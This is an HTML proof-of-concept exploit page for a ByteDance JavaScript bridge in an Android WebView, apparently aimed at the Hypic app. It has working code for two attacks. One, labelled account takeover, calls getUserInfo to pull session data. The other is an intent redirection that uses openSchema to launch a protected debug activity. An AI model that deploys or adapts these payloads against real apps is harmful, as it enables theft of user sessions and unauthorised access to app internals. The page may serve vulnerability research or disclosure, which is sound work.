<!DOCTYPE html>
<html>
<head>
    <title>Hypic JSB PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; padding: 20px; } 
        button { margin-bottom: 20px; padding: 15px; border: none; border-radius: 5px; color: white; font-weight: bold; width: 100%; }
        #btn-exfil { background: #d32f2f; }
        #btn-intent { background: #1976d2; }
        
        /* Custom Alert Box CSS */
        #custom-alert {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center;
        }
        .alert-content {
            background: white; padding: 20px; border-radius: 8px; width: 80%; 
            max-width: 400px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); word-wrap: break-word;
        }
        .alert-content h3 { margin-top: 0; color: #333; }
        .alert-content pre { background: #eee; padding: 10px; overflow-x: auto; max-height: 200px; }
        .close-btn { background: #333; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>1. Account Takeover (getUserInfo)</h2>
    <button id="btn-exfil" onclick="stealInfo()">Steal Session Data</button>

    <h2>2. Intent Redirection (openSchema)</h2>
    <button id="btn-intent" onclick="triggerIntent()">Launch Protected Activity</button>

    <!-- Custom Alert Modal -->
    <div id="custom-alert">
        <div class="alert-content">
            <h3>JSB Execution Output</h3>
            <pre id="output"></pre>
            <button class="close-btn" onclick="document.getElementById('custom-alert').style.display='none'">Close</button>
        </div>
    </div>

    <script>
        function showCustomAlert(dataObj) {
            let dataString = typeof dataObj === 'string' ? dataObj : JSON.stringify(dataObj, null, 2);
            document.getElementById('output').innerText = dataString;
            document.getElementById('custom-alert').style.display = 'flex';
        }

        // Setup the global callback receiver expected by the Bytedance SDK
        if (!window.ToutiaoJSBridge) {
            window.ToutiaoJSBridge = {};
        }

        // This intercepts the response from the app and puts it in our alert box
        window.ToutiaoJSBridge._handleMessageFromToutiao = function(message) {
            showCustomAlert(message);
        };

        function callBridge(payload) {
            try {
                const payloadStr = JSON.stringify(payload);
                if (window.JS2NativeBridge && window.JS2NativeBridge._invokeMethod) {
                    window.JS2NativeBridge._invokeMethod(payloadStr);
                } else if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.invokeMethod) {
                    window.ToutiaoJSBridge.invokeMethod(payloadStr);
                } else {
                    showCustomAlert("Error: No Bytedance JSB found in this WebView environment.");
                }
            } catch (e) {
                showCustomAlert("Error executing bridge: " + e.message);
            }
        }

        // --- EXPLOIT 1: ACCOUNT TAKEOVER ---
        function stealInfo() {
            const payload = {
                __msg_type: "call",
                func: "getUserInfo",
                params: {},
                JSSDK: "1",
                __callback_id: "exfil_1"
            };
            callBridge(payload);
        }

        // --- EXPLOIT 2: INTENT REDIRECTION ---
        function triggerIntent() {
            const targetIntent = "intent:#Intent;component=com.xt.retouchoversea/com.xt.retouch.debug.DevModelActivity;end";
            
            const payload = {
                __msg_type: "call",
                func: "openSchema",
                params: {
                    "schema": targetIntent,
                    "open_other_app": "1"
                },
                JSSDK: "1",
                __callback_id: "intent_1"
            };
            callBridge(payload);
        }
    </script>
</body>
</html>
